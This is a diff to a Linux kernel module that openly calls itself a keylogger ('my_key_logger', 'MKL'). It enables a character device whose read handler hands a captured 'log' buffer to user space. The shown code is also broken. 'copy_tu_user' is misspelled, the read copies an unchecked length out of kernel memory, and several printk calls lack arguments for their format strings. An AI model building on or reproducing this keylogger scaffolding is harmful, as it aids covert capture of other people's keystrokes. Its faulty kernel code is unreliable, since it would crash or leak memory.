@@ -22,16 +22,16 @@ static struct device* mkl_dev = NULL;
 static char *module_name = DEVICE_NAME;
 module_param(module_name, charp, S_IRUGO);
 
-/* static int dev_open(struct inode *, struct file *); */
-/* static int dev_release(struct inode *, struct file *); */
-/* static ssize_t dev_read(struct file *, char *, size_t, loff_t *); */
-/* static ssize_t dev_write(struct file *, const char *, size_t, loff_t *); */
+static int dev_open(struct inode *, struct file *);
+static int dev_release(struct inode *, struct file *);
+static ssize_t dev_read(struct file *, char *, size_t, loff_t *);
+static ssize_t dev_write(struct file *, const char *, size_t, loff_t *);
 
 static struct file_operations fops = {
-  /* .open = dev_open, */
-  /* .read = dev_read, */
-  /* .write = dev_write, */
-  /* .release = dev_release, */
+  .open = dev_open,
+  .read = dev_read,
+  .write = dev_write,
+  .release = dev_release,
 };
 
 static int __init my_key_logger_init(void){
@@ -49,7 +49,7 @@ static int __init my_key_logger_init(void){
   mkl_class = class_create(THIS_MODULE, CLASS_NAME);
   if (IS_ERR(mkl_class)) {
     unregister_chrdev(majourNumber, DEVICE_NAME);
-    printk(KERN_ALERT "%s: failed to register dev class", CLASS_NAME);
+    printk(KERN_ALERT "%s: failed to register dev class\n", CLASS_NAME);
     return PTR_ERR(mkl_class);
   }
   printk(KERN_INFO "%s: dev class registered", CLASS_NAME);
@@ -59,10 +59,10 @@ static int __init my_key_logger_init(void){
   if (IS_ERR(mkl_dev)) {
     class_destroy(mkl_class);
     unregister_chrdev(majourNumber, DEVICE_NAME);
-    printk(KERN_ALERT "%s: failed to create device", CLASS_NAME);
+    printk(KERN_ALERT "%s: failed to create device\n", CLASS_NAME);
     return PTR_ERR(mkl_dev);
   }
-  printk(KERN_INFO "%s: device class created", CLASS_NAME);
+  printk(KERN_INFO "%s: device class created\n", CLASS_NAME);
   
   return 0;
 }
@@ -73,7 +73,36 @@ static void __exit my_key_logger_exit(void){
   class_destroy(mkl_class);
   unregister_chrdev(majourNumber, DEVICE_NAME); 
   
-  printk(KERN_INFO "MKL: %s is Unloaded!", module_name);  
+  printk(KERN_INFO "MKL: %s is Unloaded!\n", module_name);  
+}
+
+static int dev_open(struct inode *inode_p, struct file * file_p) {
+  printk(KERN_INFO "%s: Open\n", CLASS_NAME);
+  
+  return 0;
+}
+
+static ssize_t dev_read(struct file *file_p, char *buffer, size_t len, loff_t *offset){
+  int error_count = copy_tu_user(buffer, log, len);
+
+  if (error_count == 0) {
+    printk(KERN_INFO "%s: Send %d characters.\n", CLASS_NAME, len);
+    // TODO: shrink log, but how copy works?
+    return len;
+  } else {
+    printk(KERN_INFO "%s: Failed Sent\n", CLASS_NAME);
+    return -EFAULT; // bad address msg (i.e. -14)
+  }
+}
+
+static ssize_t dev_write(struct file *file_p, const char *buffer, size_t len, loff_t *offset) {
+  printk(KERN_INFO "%s: Message is %s\n", buffer);
+  return len;
+}
+
+static int dev_release(struct inode *inode_p, struct file *file_p) {
+  printk(KERN_INFO "%s: close\n");
+  return 0;
 }
 
 module_init(my_key_logger_init);
